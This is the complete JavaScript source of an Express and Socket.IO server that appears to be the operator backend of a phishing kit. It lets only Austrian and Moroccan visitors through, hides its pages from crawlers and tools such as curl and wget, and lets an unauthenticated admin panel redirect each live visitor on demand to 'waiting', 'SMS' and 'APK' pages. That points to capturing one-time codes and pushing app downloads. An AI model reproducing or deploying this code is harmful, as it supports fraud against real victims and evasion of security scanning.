/**
 * Serveur Express.js avec Système de Redirection WebSocket
 * Compatible avec le front-end existant + Filtrage géographique et anti-bot
 */

const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const axios = require('axios');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

const PORT = process.env.PORT || 5000;

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Stockage des clients connectés
const clients = {};

// Cache pour les vérifications géographiques (éviter les appels répétés)
const geoCache = new Map();
const CACHE_DURATION = 3600000; // 1 heure

// Pays autorisés (Autriche et Maroc)
const ALLOWED_COUNTRIES = ['AT', 'MA'];

// Fonction utilitaire pour obtenir l'IP du client
function getClientIP(req) {
  return req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
         req.headers['x-real-ip'] ||
         req.connection.remoteAddress ||
         req.socket.remoteAddress ||
         req.ip;
}

// Fonction pour vérifier si une IP est locale/privée
function isLocalIP(ip) {
  if (!ip) return false;
  
  const localPatterns = [
    /^127\./,           // 127.x.x.x
    /^192\.168\./,      // 192.168.x.x
    /^10\./,            // 10.x.x.x
    /^172\.(1[6-9]|2[0-9]|3[0-1])\./,  // 172.16.x.x - 172.31.x.x
    /^::1$/,            // IPv6 localhost
    /^fe80:/,           // IPv6 link-local
    /^fc00:/,           // IPv6 unique local
    /^fd00:/            // IPv6 unique local
  ];
  
  return localPatterns.some(pattern => pattern.test(ip)) || 
         ip === 'localhost' || 
         ip === '::1';
}

// Fonction pour obtenir les informations géographiques d'une IP
async function getGeoInfo(ip) {
  // Vérifier le cache d'abord
  const cacheKey = ip;
  const cached = geoCache.get(cacheKey);
  
  if (cached && (Date.now() - cached.timestamp) < CACHE_DURATION) {
    return cached.data;
  }
  
  // Si IP locale, autoriser par défaut
  if (isLocalIP(ip)) {
    const localInfo = {
      country: 'Local',
      countryCode: 'LOCAL',
      allowed: true,
      reason: 'IP locale autorisée'
    };
    
    geoCache.set(cacheKey, {
      data: localInfo,
      timestamp: Date.now()
    });
    
    return localInfo;
  }
  
  try {
    // Essayer plusieurs APIs de géolocalisation
    const apis = [
      `http://ip-api.com/json/${ip}?fields=status,country,countryCode`,
      `https://freeipapi.com/api/json/${ip}`,
      `https://api.country.is/${ip}`
    ];
    
    for (const apiUrl of apis) {
      try {
        const response = await axios.get(apiUrl, { timeout: 5000 });
        let geoData = response.data;
        
        // Normaliser les réponses selon l'API
        let countryCode = null;
        let country = null;
        
        if (apiUrl.includes('ip-api.com')) {
          if (geoData.status === 'success') {
            countryCode = geoData.countryCode;
            country = geoData.country;
          }
        } else if (apiUrl.includes('freeipapi.com')) {
          countryCode = geoData.countryCode;
          country = geoData.countryName;
        } else if (apiUrl.includes('country.is')) {
          countryCode = geoData.country;
          country = geoData.country;
        }
        
        if (countryCode) {
          const geoInfo = {
            country: country || countryCode,
            countryCode: countryCode,
            allowed: ALLOWED_COUNTRIES.includes(countryCode),
            reason: ALLOWED_COUNTRIES.includes(countryCode) ? 
              'Pays autorisé' : 
              `Pays non autorisé: ${country || countryCode}`
          };
          
          // Mettre en cache
          geoCache.set(cacheKey, {
            data: geoInfo,
            timestamp: Date.now()
          });
          
          return geoInfo;
        }
      } catch (apiError) {
        console.warn(`Erreur API géolocalisation ${apiUrl}:`, apiError.message);
        continue;
      }
    }
    
    // Si toutes les APIs échouent, bloquer par sécurité
    const errorInfo = {
      country: 'Unknown',
      countryCode: 'UNKNOWN',
      allowed: false,
      reason: 'Impossible de déterminer la localisation'
    };
    
    geoCache.set(cacheKey, {
      data: errorInfo,
      timestamp: Date.now()
    });
    
    return errorInfo;
    
  } catch (error) {
    console.error('Erreur géolocalisation:', error.message);
    
    // En cas d'erreur, bloquer par sécurité
    const errorInfo = {
      country: 'Error',
      countryCode: 'ERROR',
      allowed: false,
      reason: 'Erreur de géolocalisation'
    };
    
    return errorInfo;
  }
}

// Fonction pour générer une page de blocage
function generateBlockedPage(geoInfo, userAgent) {
  return `
    <!DOCTYPE html>
    <html lang="fr">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Accès Restreint</title>
        <style>
            body {
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                margin: 0;
                padding: 0;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                color: #333;
            }
            .container {
                background: white;
                padding: 40px;
                border-radius: 15px;
                box-shadow: 0 10px 30px rgba(0,0,0,0.2);
                text-align: center;
                max-width: 500px;
                margin: 20px;
            }
            .icon {
                font-size: 64px;
                color: #e74c3c;
                margin-bottom: 20px;
            }
            h1 {
                color: #2c3e50;
                margin-bottom: 20px;
                font-size: 28px;
            }
            p {
                color: #7f8c8d;
                line-height: 1.6;
                margin-bottom: 15px;
                font-size: 16px;
            }
            .info {
                background: #f8f9fa;
                padding: 15px;
                border-radius: 8px;
                margin: 20px 0;
                border-left: 4px solid #3498db;
            }
            .footer {
                margin-top: 30px;
                font-size: 14px;
                color: #95a5a6;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="icon">🚫</div>
            <h1>Accès Restreint</h1>
            <p>Désolé, l'accès à ce site web est limité à certaines régions géographiques.</p>
            
            <div class="info">
                <strong>Votre localisation :</strong> ${geoInfo.country || 'Non déterminée'}<br>
                <strong>Raison :</strong> ${geoInfo.reason || 'Région non autorisée'}
            </div>
            
            <p>Si vous pensez qu'il s'agit d'une erreur, veuillez contacter l'administrateur du site.</p>
            
            <div class="footer">
                <p>Système de sécurité géographique actif</p>
            </div>
        </div>
    </body>
    </html>
  `;
}

// Middleware anti-bot simple
function antiBotMiddleware(req, res, next) {
  const userAgent = req.headers['user-agent'] || '';
  
  // Détecter les bots courants
  const botPatterns = [
    /bot/i,
    /crawler/i,
    /spider/i,
    /scraper/i,
    /curl/i,
    /wget/i,
    /python/i,
    /java/i,
    /go-http-client/i,
    /okhttp/i,
    /apache-httpclient/i
  ];
  
  const isBot = botPatterns.some(pattern => pattern.test(userAgent));
  
  if (isBot) {
    console.log(`🤖 Bot détecté et bloqué: ${userAgent} depuis ${getClientIP(req)}`);
    return res.status(403).send(`
      <!DOCTYPE html>
      <html>
      <head><title>Accès Refusé</title></head>
      <body>
        <h1>Accès Refusé</h1>
        <p>Les bots et crawlers ne sont pas autorisés.</p>
      </body>
      </html>
    `);
  }
  
  next();
}

// Middleware de vérification géographique (uniquement pour la page d'accueil)
async function geoCheckMiddleware(req, res, next) {
  // Appliquer uniquement à la page d'accueil
  if (req.path !== '/' && req.path !== '/index.html') {
    return next();
  }
  
  // Exclure les routes admin et API
  if (req.path.startsWith('/admin') || req.path.startsWith('/api')) {
    return next();
  }
  
  const clientIP = getClientIP(req);
  const userAgent = req.headers['user-agent'] || '';
  
  console.log(`🌍 Vérification géographique pour ${clientIP} - ${userAgent}`);
  
  try {
    const geoInfo = await getGeoInfo(clientIP);
    
    if (!geoInfo.allowed) {
      console.log(`🚫 Accès bloqué: ${clientIP} depuis ${geoInfo.country} (${geoInfo.countryCode})`);
      
      const blockedHTML = generateBlockedPage(geoInfo, userAgent);
      return res.status(403).send(blockedHTML);
    }
    
    console.log(`✅ Accès autorisé: ${clientIP} depuis ${geoInfo.country} (${geoInfo.countryCode})`);
    
    // Ajouter les informations géographiques à la requête
    req.geoInfo = geoInfo;
    
  } catch (error) {
    console.error('Erreur middleware géographique:', error);
    
    // En cas d'erreur, bloquer par sécurité
    const blockedHTML = generateBlockedPage({ 
      country: 'Unknown', 
      reason: 'Erreur de vérification' 
    }, userAgent);
    return res.status(403).send(blockedHTML);
  }
  
  next();
}

// Servir les fichiers statiques (sans vérification géographique pour les assets)
app.use('/css', express.static(path.join(__dirname, 'public/css')));
app.use('/js', express.static(path.join(__dirname, 'public/js')));
app.use('/images', express.static(path.join(__dirname, 'public/images')));
app.use('/favicon.ico', express.static(path.join(__dirname, 'public/favicon.ico')));

// Route pour la page d'accueil avec anti-bot et filtrage géographique
app.get('/', antiBotMiddleware, geoCheckMiddleware, (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Route pour index.html avec anti-bot et filtrage géographique
app.get('/index.html', antiBotMiddleware, geoCheckMiddleware, (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Autres pages HTML sans restriction géographique
app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

app.get('/*.html', (req, res) => {
  const filename = req.params[0] + '.html';
  const filePath = path.join(__dirname, 'public', filename);
  
  // Vérifier si le fichier existe
  const fs = require('fs');
  if (fs.existsSync(filePath)) {
    res.sendFile(filePath);
  } else {
    res.status(404).send('Fichier non trouvé');
  }
});

// Fonctions utilitaires
function formatLastActivity(lastSeen) {
  const now = Date.now();
  const diff = Math.floor((now - lastSeen) / 1000);
  
  if (diff < 60) return `Il y a ${diff}s`;
  if (diff < 3600) return `Il y a ${Math.floor(diff / 60)}m`;
  return `Il y a ${Math.floor(diff / 3600)}h`;
}

function getBrowserName(userAgent) {
  if (!userAgent) return 'Inconnu';
  
  if (userAgent.includes('Chrome')) return 'Chrome';
  if (userAgent.includes('Firefox')) return 'Firefox';
  if (userAgent.includes('Safari')) return 'Safari';
  if (userAgent.includes('Edge')) return 'Edge';
  if (userAgent.includes('Opera')) return 'Opera';
  
  return 'Autre';
}

function generateClientId() {
  return 'client_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
}

// Fonction pour obtenir les clients sans références circulaires
function getClientsForAdmin() {
  return Object.keys(clients).map(clientId => {
    const client = clients[clientId];
    return {
      client_id: clientId,
      ip: client.ip,
      user_agent: client.userAgent,
      last_activity: formatLastActivity(client.lastSeen),
      current_page: client.page,
      browser: getBrowserName(client.userAgent),
      country: client.geoInfo?.country || 'Unknown',
      country_code: client.geoInfo?.countryCode || 'UN'
    };
  });
}

// Fonction pour nettoyer les clients inactifs
function cleanupInactiveClients() {
  const now = Date.now();
  const timeout = 60000; // 60 secondes
  
  Object.keys(clients).forEach(clientId => {
    if (now - clients[clientId].lastSeen > timeout) {
      console.log(`Nettoyage du client inactif: ${clientId}`);
      delete clients[clientId];
      
      // Notifier tous les admins de la mise à jour
      const clientsForAdmin = getClientsForAdmin();
      io.emit('clients_update', clientsForAdmin);
    }
  });
}

// Gestion des connexions WebSocket
io.on('connection', (socket) => {
  const clientIP = getClientIP({ 
    headers: socket.handshake.headers,
    connection: socket.conn
  });
  
  console.log("Connexion WebSocket :", socket.id, "depuis", clientIP);

  // Gestion de l'enregistrement d'un nouveau client
  socket.on('new_client', async (data) => {
    console.log("New client:", data);
    
    const clientId = data.clientId || generateClientId();
    const userAgent = data.userAgent || socket.handshake.headers['user-agent'] || '';
    const page = data.page || '/';
    
    // Obtenir les informations géographiques pour le client WebSocket
    let geoInfo = null;
    try {
      geoInfo = await getGeoInfo(clientIP);
    } catch (error) {
      console.error('Erreur géolocalisation WebSocket:', error);
      geoInfo = { country: 'Unknown', countryCode: 'UNKNOWN' };
    }
    
    // Stocker le client avec toutes les informations
    clients[clientId] = {
      clientId: clientId,
      socketId: socket.id,
      ip: clientIP,
      userAgent: userAgent,
      page: page,
      lastSeen: Date.now(),
      socket: socket,
      geoInfo: geoInfo
    };
    
    console.log(`Nouveau client enregistré: ${clientId} sur ${page} depuis ${geoInfo?.country || 'Unknown'}`);
    
    // Envoyer l'ID au client
    socket.emit('client_id', { 
      client_id: clientId
    });
    
    // Émettre la mise à jour vers tous les admins
    const clientsForAdmin = getClientsForAdmin();
    io.emit('clients_update', clientsForAdmin);
  });

  // Gestion de la reconnexion d'un client existant
  socket.on('rejoin_client', (data) => {
    console.log('Événement rejoin_client reçu:', data);
    
    const { client_id } = data;
    const userAgent = socket.handshake.headers['user-agent'] || '';
    
    if (client_id && clients[client_id]) {
      // Mettre à jour les informations du client existant
      clients[client_id].socketId = socket.id;
      clients[client_id].socket = socket;
      clients[client_id].lastSeen = Date.now();
      clients[client_id].ip = clientIP;
      
      console.log(`Client reconnecté: ${client_id}`);
      
      socket.emit('client_id', { 
        client_id: client_id,
        reconnected: true 
      });
    } else {
      // Créer un nouveau client si l'ancien n'existe pas
      const newClientId = generateClientId();
      
      clients[newClientId] = {
        clientId: newClientId,
        socketId: socket.id,
        ip: clientIP,
        userAgent: userAgent,
        page: '/',
        lastSeen: Date.now(),
        socket: socket,
        geoInfo: { country: 'Unknown', countryCode: 'UNKNOWN' }
      };
      
      console.log(`Nouveau client créé lors de la reconnexion: ${newClientId}`);
      
      socket.emit('client_id', { 
        client_id: newClientId,
        reconnected: false 
      });
    }
    
    // Émettre la mise à jour vers tous les admins
    const clientsForAdmin = getClientsForAdmin();
    io.emit('clients_update', clientsForAdmin);
  });

  // Gestion des heartbeats
  socket.on('heartbeat', (data) => {
    const clientId = data.clientId || data.client_id;
    
    if (clientId && clients[clientId]) {
      clients[clientId].lastSeen = Date.now();
      if (data.page) {
        clients[clientId].page = data.page;
      }
      socket.emit('heartbeat_ack');
      
      // Émettre la mise à jour vers tous les admins
      const clientsForAdmin = getClientsForAdmin();
      io.emit('clients_update', clientsForAdmin);
    }
  });

  // Gestion des changements de page
  socket.on('page_change', (data) => {
    const clientId = data.clientId || data.client_id;
    const page = data.page;
    
    if (clientId && clients[clientId]) {
      clients[clientId].page = page;
      console.log(`Client ${clientId} sur la page: ${page}`);
      
      // Émettre la mise à jour vers tous les admins
      const clientsForAdmin = getClientsForAdmin();
      io.emit('clients_update', clientsForAdmin);
    }
  });

  // Gestion des demandes de liste de clients (pour l'admin)
  socket.on('get_clients', () => {
    console.log('Admin demande la liste des clients');
    const clientsForAdmin = getClientsForAdmin();
    socket.emit('clients_update', clientsForAdmin);
  });

  // Gestion des redirections depuis l'admin
  socket.on('redirect', (data) => {
    const { clientId, url } = data;
    
    console.log(`Redirection demandée pour client ${clientId} vers ${url}`);
    
    if (clients[clientId]) {
      console.log(`Envoi de la redirection au client ${clientId} vers ${url}`);
      
      clients[clientId].socket.emit('redirect', { 
        url: url 
      });
      
      socket.emit('redirect_sent', { 
        success: true, 
        clientId: clientId, 
        url: url 
      });
    } else {
      console.log(`Client ${clientId} non trouvé pour la redirection`);
      socket.emit('redirect_sent', { 
        success: false, 
        error: 'Client non trouvé' 
      });
    }
  });

  // Gestion des pings
  socket.on('ping', () => {
    socket.emit('pong');
  });

  // Gestion de la déconnexion
  socket.on('disconnect', (reason) => {
    console.log(`Client déconnecté: ${socket.id} - Raison: ${reason}`);
    
    Object.keys(clients).forEach(clientId => {
      if (clients[clientId].socketId === socket.id) {
        delete clients[clientId];
        console.log(`Client ${clientId} supprimé de la liste`);
        
        // Émettre la mise à jour vers tous les admins
        const clientsForAdmin = getClientsForAdmin();
        io.emit('clients_update', clientsForAdmin);
      }
    });
  });
});

// API pour obtenir la liste des clients (pour l'admin)
app.get('/api/clients', (req, res) => {
  const clientsArray = getClientsForAdmin();
  console.log('API /clients appelée, retour de', clientsArray.length, 'clients');
  res.json(clientsArray);
});

// API pour les statistiques
app.get('/api/stats', (req, res) => {
  res.json({
    clients_actifs: Object.keys(clients).length,
    total_clients: Object.keys(clients).length,
    redirections: 0,
    uptime: Math.floor(process.uptime() / 3600)
  });
});

// API pour les pages prédéfinies
app.get('/api/pages', (req, res) => {
  res.json({
    index: { name: "Index", url: "/index.html" },
    att: { name: "Attente", url: "/att.html" },
    sms: { name: "SMS", url: "/sms.html" },
    apk: { name: "APK", url: "/apk.html" }
  });
});

// API pour les logs
app.get('/api/logs', (req, res) => {
  const logs = [
    `${new Date().toISOString()} - Serveur démarré avec filtrage géographique`,
    `${new Date().toISOString()} - ${Object.keys(clients).length} clients connectés`,
    `${new Date().toISOString()} - Pays autorisés: ${ALLOWED_COUNTRIES.join(', ')}`,
    `${new Date().toISOString()} - Système anti-bot actif`
  ];
  
  res.json({ logs: logs });
});

// API pour rediriger un client
app.post('/api/redirect', (req, res) => {
  const { client_id, redirect_url } = req.body;
  
  console.log(`API redirect appelée pour client ${client_id} vers ${redirect_url}`);
  
  if (!client_id || !redirect_url) {
    return res.status(400).json({ 
      success: false, 
      error: 'client_id et redirect_url requis' 
    });
  }
  
  if (clients[client_id]) {
    console.log(`Envoi de la redirection API au client ${client_id} vers ${redirect_url}`);
    
    clients[client_id].socket.emit('redirect', { 
      url: redirect_url 
    });
    
    res.json({ 
      success: true, 
      message: 'Redirection envoyée' 
    });
  } else {
    console.log(`Client ${client_id} non trouvé pour la redirection API`);
    res.status(404).json({ 
      success: false, 
      error: 'Client non trouvé' 
    });
  }
});

// API pour vérifier la géolocalisation
app.get('/api/geo-check', async (req, res) => {
  const clientIP = getClientIP(req);
  
  try {
    const geoInfo = await getGeoInfo(clientIP);
    
    res.json({
      ip: clientIP,
      country: geoInfo.country,
      countryCode: geoInfo.countryCode,
      allowed: geoInfo.allowed,
      reason: geoInfo.reason
    });
  } catch (error) {
    console.error('Erreur API geo-check:', error);
    res.status(500).json({
      error: 'Erreur de géolocalisation'
    });
  }
});

// Nettoyage automatique des clients inactifs toutes les 30 secondes
setInterval(cleanupInactiveClients, 30000);

// Nettoyage du cache géographique toutes les heures
setInterval(() => {
  const now = Date.now();
  for (const [key, value] of geoCache.entries()) {
    if (now - value.timestamp > CACHE_DURATION) {
      geoCache.delete(key);
    }
  }
  console.log(`🧹 Cache géographique nettoyé. Entrées restantes: ${geoCache.size}`);
}, 3600000); // 1 heure

// Démarrage du serveur
server.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Serveur démarré sur http://0.0.0.0:${PORT}`);
  console.log(`📊 Interface d'administration: http://0.0.0.0:${PORT}/admin`);
  console.log(`🌍 Filtrage géographique actif pour: ${ALLOWED_COUNTRIES.join(', ')}`);
  console.log(`🤖 Système anti-bot activé`);
  console.log(`📡 Événements WebSocket supportés:`);
  console.log(`   - new_client : Nouveau client`);
  console.log(`   - rejoin_client : Reconnexion client`);
  console.log(`   - heartbeat : Maintien de connexion`);
  console.log(`   - page_change : Changement de page`);
  console.log(`   - get_clients : Demande liste clients (admin)`);
  console.log(`   - redirect : Redirection client (admin)`);
  console.log(`✅ Serveur prêt à recevoir les connexions`);
});

module.exports = { app, server, io };

